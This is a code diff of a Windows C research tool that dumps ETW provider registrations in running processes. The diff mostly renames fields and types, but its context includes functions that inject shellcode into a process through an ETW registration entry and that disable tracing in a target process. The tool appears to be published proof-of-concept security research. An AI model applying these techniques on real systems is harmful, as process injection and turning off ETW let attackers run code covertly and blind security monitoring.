@@ -140,9 +140,10 @@ BSTR etw_id2name(OLECHAR *id) {
     return hr == S_OK ? name : L"Unknown";
 }
 
+// Display information about an ETW registration entry
 VOID etw_reg_info(
     HANDLE              hp, 
-    RTL_BALANCED_NODE   *node,
+    PRTL_BALANCED_NODE  node,
     PETW_USER_REG_ENTRY re, 
     int                 tabs) 
 {
@@ -203,22 +204,25 @@ VOID etw_reg_info(
     putchar('\n');
     
     wprintf(L"%*sIndex       : %i\n", 
-      tabs, L"\t", re->Index);
+      tabs, L"\t", re->RegIndex);    
       
-    // display the registration handle
-    // can be used with EventUnregister
+    wprintf(L"%*sType        : %i (0x%x)\n", 
+      tabs, L"\t", re->RegType,re->RegType);
+      
+    // display the registration handle that
+    // can be used with EtwEventUnregister
     wprintf(L"%*sReg Handle  : %p\n\n",
       tabs, L"\t", 
-      (PVOID)((ULONG64)node | (ULONG64)re->Index << 48));
+      (PVOID)((ULONG64)node | (ULONG64)re->RegIndex << 48));
 }
 
 // dump nodes
 VOID etw_dump_nodes(
-    HANDLE            hp, 
-    RTL_BALANCED_NODE *node, 
-    PWCHAR            dll,
-    int               opt,    
-    int               tabs) 
+    HANDLE             hp, 
+    PRTL_BALANCED_NODE node, 
+    PWCHAR             dll,
+    int                opt,    
+    int                tabs) 
 {
     SIZE_T             rd;
     BOOL               bRead;
@@ -245,8 +249,8 @@ VOID etw_dump_nodes(
       etw_reg_info(hp, node, &re, tabs + 1);
     }
     
-    etw_dump_nodes(hp, re.Nodes.Children[0], dll, opt, tabs + 1);
-    etw_dump_nodes(hp, re.Nodes.Children[1], dll, opt, tabs + 1);
+    etw_dump_nodes(hp, re.RegList.Children[0], dll, opt, tabs + 1);
+    etw_dump_nodes(hp, re.RegList.Children[1], dll, opt, tabs + 1);
 }
 
 VOID etw_search_process(
@@ -322,7 +326,7 @@ LPVOID etw_get_table_va(VOID) {
 }
 
 // search for a provider in a process
-RTL_BALANCED_NODE *etw_get_reg(
+PRTL_BALANCED_NODE etw_get_reg(
     HANDLE              hp, 
     LPVOID              etw, 
     PWCHAR              prov, 
@@ -364,9 +368,9 @@ RTL_BALANCED_NODE *etw_get_reg(
         found = TRUE;
         break;
       } else if(cmp < 0) {
-        node = re->Nodes.Children[0];
+        node = re->RegList.Children[0];
       } else {
-        node = re->Nodes.Children[1];
+        node = re->RegList.Children[1];
       }
     }
     return node;
@@ -374,19 +378,19 @@ RTL_BALANCED_NODE *etw_get_reg(
 
 // inject shellcode into process using ETW registration entry
 BOOL etw_inject(DWORD pid, PWCHAR path, PWCHAR prov) {
-    RTL_RB_TREE            tree;
-    PVOID                  etw, pdata, cs, callback;
-    HANDLE                 hp;
-    SIZE_T                 rd, wr;
-    ETW_USER_REG_ENTRY     re;
-    RTL_BALANCED_NODE      *node;
-    OLECHAR                id[40];
-    TRACEHANDLE            ht;
-    DWORD                  plen, bufferSize;
-    PWCHAR                 name;
-    EVENT_TRACE_PROPERTIES *prop;
-    BOOL                   status = FALSE;
-    const wchar_t          etwname[]=L"etw_injection\0";
+    RTL_RB_TREE             tree;
+    PVOID                   etw, pdata, cs, callback;
+    HANDLE                  hp;
+    SIZE_T                  rd, wr;
+    ETW_USER_REG_ENTRY      re;
+    PRTL_BALANCED_NODE      node;
+    OLECHAR                 id[40];
+    TRACEHANDLE             ht;
+    DWORD                   plen, bufferSize;
+    PWCHAR                  name;
+    PEVENT_TRACE_PROPERTIES prop;
+    BOOL                    status = FALSE;
+    const wchar_t           etwname[]=L"etw_injection\0";
     
     if(path == NULL) return FALSE;
     
@@ -530,9 +534,9 @@ DWORD WINAPI DisableStub(LPVOID lpParameter) {
 int DisableStubEnd(int a, int b) { return a + b; }
 
 BOOL etw_disable(
-    HANDLE            hp,
-    RTL_BALANCED_NODE *node,
-    USHORT            index) 
+    HANDLE             hp,
+    PRTL_BALANCED_NODE node,
+    USHORT             index) 
 {
     HMODULE               m;
     HANDLE                ht;
@@ -610,7 +614,7 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
     SIZE_T             rd;
     LPVOID             etw;
     ETW_USER_REG_ENTRY re;
-    RTL_BALANCED_NODE  *node;
+    PRTL_BALANCED_NODE node;
     
     etw = etw_get_table_va();
     
@@ -653,7 +657,7 @@ VOID etw_search_system(DWORD pid, PWCHAR dll, PWCHAR prov, int opt) {
               // disable it?
               if(opt & ETW_OPT_DISABLE) {
                 wprintf(L"Tracing disabled: %s\n",
-                  etw_disable(hp, node, re.Index) ? L"OK" : L"FAILED");
+                  etw_disable(hp, node, re.RegIndex) ? L"OK" : L"FAILED");
               }
             }
           } else {
@@ -686,7 +690,7 @@ int wmain(int argc, WCHAR *argv[]) {
             *process = NULL;
     int     i, pid=0, opt = ETW_OPT_SEARCH;
     
-    puts("\nETW Scan. PoC injection/scanning for ETW - odzhan\n");
+    puts("\nETW Registration Dumper. Copyright (c) Odzhan\n");
     
     for(i=1; i<=argc-1; i++) {
       // is this a switch?
